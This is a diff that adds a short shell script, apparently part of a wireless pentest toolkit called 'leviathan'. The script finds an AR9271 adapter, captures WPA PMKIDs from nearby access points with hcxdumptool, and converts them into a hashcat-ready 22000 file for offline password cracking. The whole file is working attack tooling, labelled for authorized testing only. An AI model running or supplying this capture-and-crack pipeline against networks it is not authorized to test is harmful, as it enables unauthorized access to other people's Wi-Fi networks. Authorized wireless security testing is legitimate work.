@@ -1,0 +1,34 @@
+#!/bin/sh
+# leviathan-pmkid — clientless PMKID grab on the AR9271, via hcxdumptool,
+# converted to a hashcat-ready 22000 file with hcxpcapngtool.
+# Authorized testing and education only.
+#
+#   leviathan-pmkid [seconds]       default 60s
+#
+# Needs the AR9271 present. hcxdumptool manages monitor mode itself, so
+# bring mon0 DOWN first (leviathan-mon down) to avoid fighting over the phy.
+
+SECS="${1:-60}"
+command -v hcxdumptool >/dev/null || { echo "[leviathan] hcxdumptool missing"; exit 1; }
+
+# find the ath9k_htc netdev (wlanX), not the onboard AP
+IF=""
+for w in /sys/class/net/wlan*; do
+	[ -e "$w" ] || continue
+	drv=$(readlink -f "$w/device/driver" 2>/dev/null)
+	echo "$drv" | grep -q ath9k_htc && IF=$(basename "$w")
+done
+[ -n "$IF" ] || { echo "[leviathan] no ath9k_htc wlan found — is the AR9271 plugged in?"; exit 1; }
+
+mkdir -p /tmp/leviathan
+OUT="/tmp/leviathan/pmkid-$(date +%H%M%S)"
+echo "[leviathan] PMKID capture on $IF for ${SECS}s"
+timeout "$SECS" hcxdumptool -i "$IF" -w "${OUT}.pcapng" --enable_status=1 2>/dev/null
+
+if command -v hcxpcapngtool >/dev/null; then
+	hcxpcapngtool -o "${OUT}.22000" "${OUT}.pcapng" >/dev/null 2>&1
+	N=$(wc -l < "${OUT}.22000" 2>/dev/null || echo 0)
+	echo "[leviathan] ${N} hash line(s) -> ${OUT}.22000  (raw: ${OUT}.pcapng)"
+else
+	echo "[leviathan] raw capture -> ${OUT}.pcapng (install hcxtools for 22000 conversion)"
+fi
